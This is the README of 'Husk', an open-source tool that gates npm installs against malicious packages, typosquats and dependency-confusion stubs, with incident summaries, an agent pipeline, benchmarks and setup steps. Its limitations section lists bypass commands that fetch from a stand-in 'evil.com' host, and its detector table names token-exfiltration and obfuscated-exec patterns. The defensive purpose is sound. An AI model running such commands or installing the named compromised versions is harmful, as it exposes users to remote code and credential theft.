# Husk

[Watch the demo](https://youtu.be/LEtR2POYbRI?si=42dowIe5EzObO8RU)

> Agentic install-time supply-chain security gate for npm and PyPI. Multi-agent verdicts, local registry proxy, honest Wilson-CI benchmarks.

```
$ npm install @ctrl/tinycolor@4.1.1

✗ Husk: registry takedown @ctrl/tinycolor has unpublished versions: 4.1.1, 4.1.2.
  If npm just failed with ETARGET, you likely asked for one of these.
  Run `husk scan @ctrl/tinycolor@<version>` for the full verdict.
  Logged to ~/.husk/intercept.log

npm error code ETARGET
```

Husk sits in front of `npm install` and blocks malicious packages, typosquats, registry takedowns, and dependency-confusion stubs **before they reach your filesystem** — entirely locally, no SaaS account required.

---

## 1. The Problem

The JavaScript and Python supply chain has become the highest-leverage attack surface in modern software. A single compromised package with millions of weekly downloads gives an attacker root-level execution on every developer machine that runs `npm install` for the next 24 hours. The threat is not theoretical — every category below has a confirmed 2024-2026 incident.

### Recent incidents (verified, public)

**Worm propagation — Shai-Hulud (Sept 2025) and Shai-Hulud 2.0 (Nov 2025).** A self-replicating worm compromised maintainer accounts via phishing, then used stolen npm tokens to auto-republish poisoned versions of up to 100 *other* packages per victim. The second wave compromised **600-800 npm packages**, created **25,000 malicious GitHub repositories**, and hit Zapier, Postman, ENS Domains, and PostHog. The 2.0 variant deletes the user's home directory if it cannot propagate. ([JFrog analysis](https://research.jfrog.com/post/shai-hulud-the-second-coming/), [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/))

**Maintainer account takeover — Axios (March 2026).** Attackers compromised the npm account of axios's primary maintainer and published versions `1.14.1` and `0.30.4`, both shipping a Remote Access Trojan via a poisoned dependency `plain-crypto-js`. Axios has **50M+ weekly downloads.** Wiz observed RAT execution in approximately 3% of environments running affected versions. ([Bitdefender advisory](https://www.bitdefender.com/en-us/blog/businessinsights/technical-advisory-axios-npm-supply-chain-attack-cross-platform-rat-deployed-compromised-account))

**Cryptojacking — Rspack and Vant (2025).** Three popular packages — `@rspack/core`, `@rspack/cli`, and `Vant` — were compromised using stolen npm tokens to deploy XMRig Monero miners. The malicious code was embedded in support files and executed via `postinstall`, intentionally **capping CPU at 75%** to avoid user detection. Rspack alone had 394k weekly downloads. ([ClickControl](https://clickcontrol.com/cyber-crime/alert-popular-npm-packages-hijacked-to-deploy-crypto-miners-in-major-supply-chain-attack/))

**Slow-burn supply chain attack — `@0xengine/xmlrpc` (Oct 2023 → Nov 2024).** A package masquerading as legitimate XML-RPC tooling exfiltrated SSH keys and `.bash_history` every 12 hours and mined Monero on victim machines. **It ran for a full year**, with 16 cosmetic releases to maintain the appearance of legitimate maintenance. 68 active mining hosts confirmed. ([Checkmarx](https://checkmarx.com/blog/dozens-of-machines-infected-year-long-npm-supply-chain-attack-combines-crypto-mining-and-data-theft))

**Registry leaks via npm publish mistakes — Claude Code (March 2026).** Anthropic accidentally shipped a 59.8 MB source-map file in `@anthropic-ai/claude-code@2.1.88`, exposing **the entire 512,000-line proprietary TypeScript source** of Claude Code on the public npm registry. Within hours, mirrored repositories accumulated ~30,000 GitHub stars; developers reverse-engineered the architecture and rebuilt working Claude Code executables. **This was the second time** Anthropic made this exact mistake (the first was February 2025). The root cause was a missing `*.map` exclusion in `.npmignore`. ([dev.to teardown](https://dev.to/vibehackers/i-analyzed-all-512000-lines-of-claude-codes-leaked-source-heres-what-anthropic-was-hiding-4gg8), [security analysis of v2.1.88](https://b.zzn.im/blog/claude-code-v2.1.88-security-analysis/))

The Claude Code leak matters because it shows the same supply chain pipeline is dangerous from *both* directions — careless publish and malicious install. Even one of the most security-conscious AI companies in the world shipped its proprietary source by mistake. The brittleness of npm publishing is structural, not a "bad developers" problem.

### Why `npm audit` and CVE-based tools are not enough

The dominant defense — `npm audit`, Snyk, Dependabot, OSV-Scanner — all match installed packages against a CVE database. **By construction, this only catches attacks that have already been disclosed.**

The window that matters for supply chain attacks is the gap between malicious publication and CVE assignment. Looking at the four incidents above:

| Incident | Time-to-CVE | Hosts compromised in that window |
|---|---|---|
| Shai-Hulud 1.0 | ~48 hours | hundreds of packages, thousands of devs |
| Axios | ~6-8 hours | ~3% of all environments running affected versions |
| `@0xengine/xmlrpc` | **~12 months** | 68 active mining hosts |
| Rspack | ~24 hours | unknown, exposure measured in weeks before cleanup |

CVE-based scanners are necessary but they are the wrong layer for *novel* malware. By the time a CVE exists, the damage is already cumulative.

The other thing CVE scanners miss entirely is the structural attack class — **dependency-confusion stubs**: empty packages published to the public registry that share names with private internal packages, exploiting npm's resolution rules. There is no malicious code to scan. The attack works precisely because the package is empty. CVE databases have no concept of this.

---

## 2. The Solution: Husk

Husk is a local, install-time gate that catches malicious packages **before** they reach the filesystem. It runs as a transparent registry proxy in front of npm, evaluating every package through six static detectors and seven AI agents before forwarding the tarball.

### Architecture in one diagram

```
                      ┌──────────────────────────────────────────────┐
   npm install ──────▶│  Husk local registry proxy (localhost:4873)  │
                      └─────────────────────┬────────────────────────┘
                                            │
                          ┌─────────────────┴───────────────────┐
                          │       7-stage agent pipeline        │
                          ├─────────────────────────────────────┤
                          │  1. Triage agent     (LLM)          │
                          │  2. Static analysis  (parallel):    │
                          │     • IOC matcher                   │
                          │     • Deobfuscator (AST + Babel)    │
                          │     • Behavior diff vs prior ver    │
                          │     • Typosquat detector            │
                          │     • Package-shape detector        │
                          │     • Sandbox (Docker, optional)    │
                          │  3. Verdict agent    (rule + AI)    │
                          │  4. Investigator agent (LLM, loop)  │ ◀── autonomous tool selection
                          │  5. Policy engine    (deterministic)│
                          │  6. Reporter agent   (LLM)          │
                          │  7. Action agent     (LLM)          │
                          └─────────────────┬───────────────────┘
                                            │
                            ALLOW / WARN / BLOCK + verdict card
                                            │
                                            ▼
                         tarball forwarded ⇄ 403 Blocked by Husk
```

### What each detector catches

| Detector | What it sees | Example signal |
|---|---|---|
| **IOC matcher** | regex/AST patterns on filenames, package.json, source content | Shai-Hulud's `bun_environment.js` filename, `process.env.NPM_TOKEN` exfiltration patterns, known C2 domains |
| **Deobfuscator** | string-array decoding, eval-unwrap, base64 decode, AST suspicion scorer | Obfuscated `child_process.exec(...)` reconstructed from `obj['ex'+'ec']()` |
| **Behavior diff** | new capabilities vs prior version (network, install-script changes) | Postinstall hook added between `1.4.0` → `1.4.1` |
| **Typosquat detector** | Levenshtein + keyboard-distance + scope confusion against curated popular-package list | `noblox.js-server` vs legitimate `noblox.js` |
| **Package-shape** | empty source code + suspicious name patterns + missing README | Dependency-confusion stubs like `0vulns-dependency-confusion-poc` |
| **Registry takedown** | unpublished versions, security placeholders in metadata | `@ctrl/tinycolor@4.1.1` (Shai-Hulud target, since unpublished) |
| **Sandbox** *(optional, Docker)* | actual execution traced via `strace` | Real network calls, real file writes, real spawned processes |

### What each AI agent does

| Agent | Role | LLM autonomy |
|---|---|---|
| **Triage** | Decides whether to invoke the deobfuscator and sandbox | Bounded yes/no |
| **Deobfuscator** | Wraps the AST pipeline (no LLM by itself) | None |
| **Dynamic** | Narrates sandbox execution traces in plain English | Generation only |
| **Verdict** | Multi-signal correlation, Wilson-calibrated confidence | None (rule-based) |
| **Investigator** | **Autonomous re-investigation loop on borderline verdicts** | Selects which files to inspect, frames the focus question, synthesizes findings into a verdict adjustment. Two-call agentic loop with hard guards against overriding CRITICAL signals. |
| **Reporter** | Generates the human-readable advisory text | Generation only |
| **Action** | Generates the "what to do next" recommendation | Generation only |

The investigator agent is the genuinely autonomous component: when the first-pass verdict is borderline (low-confidence SUSPICIOUS, or CLEAN with a suppressed signal), it decides for itself whether the case warrants deeper inspection, picks up to 3 files from the package source, and reads them with a focused question before committing to a verdict adjustment.

### Tech stack

- **TypeScript** end-to-end (strict mode, ESM, target ES2022)
- **Node.js 20+** runtime
- **Babel parser + traverse + generator** for the deobfuscator AST pipeline
- **Express** for the local intercept proxy
- **Docker + dockerode** for the sandbox subsystem (with seccomp profile, read-only filesystem, network namespace isolation)
- **OpenAI SDK** with native OpenAI + OpenRouter transports (multi-provider; deterministic fallback for every stage)
- **Zod** for structured AI output validation
- **Glob + chalk + ora + commander** for the CLI surface
- **Vitest** for unit + integration tests

### What it looks like end-to-end

```bash
$ husk intercept --enable

  ✓ Husk interception enabled on http://localhost:4873 (pid 64861)
    .npmrc now points npm at the Husk proxy. Plain 'npm install' is gated.
    Live takedown banners will appear in this terminal (/dev/ttys073).

$ npm install react@18.2.0
✓ Husk allowed react@18.2.0   clean · conf 30% · 14.2s   [behavior ✓]
✓ Husk allowed loose-envify@1.4.0 clean · conf 30% · 8.1s
added 2 packages in 23s

$ npm install @ctrl/tinycolor@4.1.1
✗ Husk: registry takedown @ctrl/tinycolor has unpublished versions: 4.1.1, 4.1.2.
npm error code ETARGET
```

### Benchmark (latest, on 100 packages)

```
Mode: static-only · AI: openrouter (llama-3.3-70b-instruct:free)
Latency: p50 491ms · p95 6.0s · p99 38.9s · wall 3m25s

  Precision  97.3%  [86.2%, 99.5%]   of 37 flagged, 36 truly malicious
  Recall     72.0%  [58.3%, 82.5%]   caught 36 of 50 malicious
  F1         82.8%  [73.0%, 90.7%]   bootstrapped 95% CI
  FP rate     2.0%  [0.4%, 10.5%]    1 of 50 benign packages mistakenly flagged
```

Run yourself with `husk benchmark`. The report includes Wilson 95% confidence intervals, baseline comparisons (always-allow, always-block, name-keyword regex), top-5 false-positive and false-negative tables with evidence, data-leakage detection, and full provenance (Husk version, git SHA, AI provider, OS, sample sizes).

---

## 3. Why Husk over alternatives

There are a handful of tools in this space. Each of them sits in a different region of the trade-off space, and Husk's niche is specifically: **open-source, local, install-time, multi-AI-provider, with honest measurement.**

### vs **Socket.dev** (the closest commercial competitor)

Socket Firewall is the closest direct comparison — it's also a local registry proxy that gates installs. The differences:

| | Husk | Socket Firewall |
|---|---|---|
| Source available | ✓ MIT, fully auditable | Proprietary (CLI is open-source, detection logic is not) |
| Pricing | Free forever | Free tier (1k scans/mo); $25-$50/dev/mo for serious use |
| Threat intel | Static IOC ruleset (you maintain) | Maintained daily by Socket security team |
| AI provider | Multi-provider: OpenAI, OpenRouter (incl. free tier), Ollama-compatible | OpenAI only (server-side) |
| Runs offline | Yes (with deterministic fallback) | No |
| Dependency graph leaves your machine | No, never | Yes, sent to Socket |
| Org dashboard / SBOM export | No | Yes |
| Honest Wilson-CI benchmarks in repo | Yes | No public benchmark methodology |

Socket is more polished and has a paid threat-intel feed Husk doesn't. Husk's value: **everything stays on your machine, source is auditable, no per-developer pricing**.

### vs **Snyk / npm audit / Dependabot / OSV-Scanner**

These are CVE-database matchers. They catch known vulnerabilities *after* CVEs are published. Husk catches malware *before* CVEs exist. Different problems; both worth running.

### vs **Sandworm Audit** (the closest OSS comparison)

Sandworm scans dependency trees for CVEs and license issues; it's well-built and has 475 GitHub stars. But it does not:
- Sit in front of `npm install` as a gate
- Detect Shai-Hulud-class IOC patterns
- Run typosquat detection
- Catch dependency-confusion stubs
- Use AI agents for verdict refinement
- Run a sandbox

It's a complementary tool — run both.

### vs **Shoo, Shai-Hulud-Scanner, npx-ray** (single-purpose OSS scanners)

Each catches one specific attack family or runs one heuristic. Husk is the multi-detector pipeline these would be a subset of.

### vs **Claude Code, Cursor, and other AI coding assistants**

Sometimes proposed as a substitute for security tooling because "the AI can analyze any package." Three reasons that doesn't hold up:

1. **Cost and speed.** A typical npm install pulls 50-500 packages. Each AI scan is 30-90 seconds and ~$0.10-$0.50 per package via API. A real install becomes 2-3 hours and $20-100 in API spend. Husk does the same work in 3 minutes for $0.
2. **Determinism.** Security gates need exit-code-40-every-time on the same input. AI agents are non-deterministic. Husk's deterministic verdict layer doesn't change between runs; the AI layer only refines on top.
3. **No baked-in threat intel.** AI agents have no Shai-Hulud signature database, no popular-package allowlist for typosquat scoring, no registry-takedown intelligence, no Docker sandbox. These are *artifacts*, not capabilities. Husk ships them.

The real complement: when Husk flags a borderline case, AI assistants are excellent at the follow-up investigation. They are not a substitute for the gate.

---

## 4. Setup and precautions

### Prerequisites

| | Required | Why |
|---|---|---|
| **Node.js** ≥ 20 | yes | ESM modules, native fetch |
| **npm** | yes | Package manager Husk gates |
| **Git** | yes | Cloning datasets, version detection |
| **Docker Desktop** | optional | Required only for the sandbox subsystem; Husk works without it |
| **OpenRouter or OpenAI API key** | optional but recommended | AI agents fall back to deterministic mode without one; ~5 pp F1 gain with AI on |

### Quick start (5 minutes, $0)

```bash
git clone https://github.com/samkwak188/Husk-Agentic-dependency-security-CLI.git
cd Husk-Agentic-dependency-security-CLI
npm install            # `prepare` script auto-builds dist/
npm install -g .       # adds `husk` to your PATH
husk                   # see the welcome banner
```

### `.env` configuration (free OpenRouter)

Copy `.env.example` to `.env` and fill in:

```bash
AI_PROVIDER=openrouter
OPENROUTER_API_KEY=sk-or-v1-...     # get one at https://openrouter.ai/keys

# Free models — no credits required, no credit card required.
OPENROUTER_MODEL=meta-llama/llama-3.3-70b-instruct:free
OPENROUTER_MODEL_DYNAMIC=meta-llama/llama-3.3-70b-instruct:free
OPENROUTER_MODEL_REPORTER=meta-llama/llama-3.3-70b-instruct:free

# Improves OpenRouter free-tier reliability.
OPENROUTER_HTTP_REFERER=https://github.com/<your-username>/Husk-Agentic-dependency-security-CLI
OPENROUTER_APP_TITLE=Husk
```

OpenRouter free tier: 20 requests/minute, 200/day per model. Enough for ~3 benchmark runs/day or unlimited single scans. Top up $5 to lift the rate limits if you need to iterate heavily.

### First scan

```bash
husk scan @ctrl/tinycolor@4.1.1   # confirmed Shai-Hulud target — should BLOCK
husk scan react@18.2.0            # legitimate — should ALLOW with low confidence
```

### Run the benchmark

```bash
npm run setup             # clones the DataDog + Backstabbers malicious datasets
husk benchmark            # ~3-15 min depending on AI provider speed
```

For fast iteration without AI calls (deterministic-only, ~2 min):

```bash
HUSK_BENCHMARK_NO_AI=1 husk benchmark
```

### Enable transparent install gating

```bash
husk intercept --enable

# from now on, every `npm install` in this directory hits the proxy first
npm install react
# → ✓ Husk allowed react@18.x.x   clean · conf 30% · 12s

npm install some-malicious-package
# → ✗ DO NOT INSTALL card on stdout
# → npm error code E403 - Blocked by Husk

husk intercept --logs       # full audit log
husk intercept --status     # check if proxy is running
husk intercept --disable    # cleanup
```

### Optional: enable the sandbox

```bash
npm run setup            # also builds the husk-sandbox Docker image
husk scan some-package --sandbox
```

The sandbox runs the package's install script in an isolated Docker container with `strace`-traced syscalls, a hardened seccomp profile, and a fresh network namespace. Recommended for any high-stakes scan.

---

## Precautions and known limitations

Be honest about what Husk does and doesn't defend against:

### What Husk does NOT catch
- `npm install git+https://evil.com/repo.git` — bypasses the registry entirely
- `npm install ./local-malicious-package` — file-path installs don't HTTP-fetch
- `npm install --registry=https://evil.com` — user explicitly bypasses the proxy
- Postinstall scripts of packages **already installed** before intercept was enabled
- Indirect installs via `pnpm` or `yarn` — Husk's `.npmrc` only configures `npm`
- Packages cached locally by npm (run `npm cache clean --force` to force a fresh fetch)
- **Empty dependency-confusion stubs that the package-shape detector misses** (e.g. names without typical attack-keyword tokens) — recall on novel attacks of this class is genuinely lower than the headline 72%

### Operational precautions

- **Treat your `.env` as a secret.** It contains your AI API key. The `.gitignore` excludes it; verify with `git check-ignore .env` before any push.
- **Don't expose the intercept proxy publicly.** It binds to `localhost:4873` by default, which is correct. If you change `--port`, do not bind to `0.0.0.0` — the proxy proxies tarballs *and* metadata; a publicly-bound proxy is a man-in-the-middle waiting to happen.
- **The included threat-intel rules are static.** Husk ships with Shai-Hulud, dependency-confusion, and credential-pattern rules current as of April 2026. New attack families will need rule updates. The IOC files are at `src/subsystems/ioc-matcher/rules/` if you want to add your own.
- **AI verdicts are non-deterministic.** Two scans of the same package can produce slightly different AI-narration text. The deterministic verdict (CLEAN/SUSPICIOUS/MALICIOUS) is stable; only the prose layer varies.
- **Sandbox requires Docker.** No sandbox on Windows-without-WSL or environments without Docker Desktop.
- **The benchmark dataset is small.** 50 malicious + 50 benign. Confidence intervals are wide — read them, not the point estimates.

### Security recommendations for contributors

If you fork or modify Husk:
- Don't add detectors that send package contents to remote services without a clear opt-in.
- Don't relax the `applyInvestigation` hard guards — the investigator agent must never override CRITICAL signals or high-severity verdicts.
- If you add a new AI provider, make sure the deterministic fallback path still produces the same verdict (only the *narration* should change).

---

## License

MIT.

## Acknowledgments

- DataDog Security Labs and the maintainers of the [malicious-software-packages-dataset](https://github.com/DataDog/malicious-software-packages-dataset) for the labeled npm/PyPI threat samples.
- Backstabber's Knife Collection dataset.
- The `@babel/*` toolchain, which powers the deobfuscator's AST pipeline.
- The security research community whose post-mortems on Shai-Hulud, Axios, and the Claude Code source leak are cited throughout this README.

## Repository

[github.com/samkwak188/Husk-Agentic-dependency-security-CLI](https://github.com/samkwak188/Husk-Agentic-dependency-security-CLI)
